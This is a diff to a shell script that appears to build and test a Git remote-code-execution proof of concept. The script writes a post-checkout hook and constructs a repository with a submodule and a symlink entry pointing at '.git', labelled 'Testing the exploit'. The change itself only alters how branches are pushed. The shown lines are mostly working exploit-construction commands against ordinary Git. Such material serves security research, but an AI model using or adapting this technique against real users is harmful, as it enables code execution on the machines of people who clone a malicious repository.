@@ -53,7 +53,7 @@ fi
 "$git_editor" "$PWD/scripts/hooks/post-checkout"
 git add scripts/hooks/post-checkout
 git commit -m "add-post-checkout"
-git push origin $(git rev-parse --abbrev-ref HEAD)
+git push origin HEAD
 cd ..
 echo Constructing main repo...
 mkdir -p git_rce_main
@@ -68,7 +68,7 @@ git add .gitmodules
 git commit -m "add-submodule"
 git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk
 git commit -m "add-symlink"
-git push origin $(git rev-parse --abbrev-ref HEAD)
+git push origin HEAD
 cd ..
 echo Testing the exploit...
 mkdir -p git_rce_test
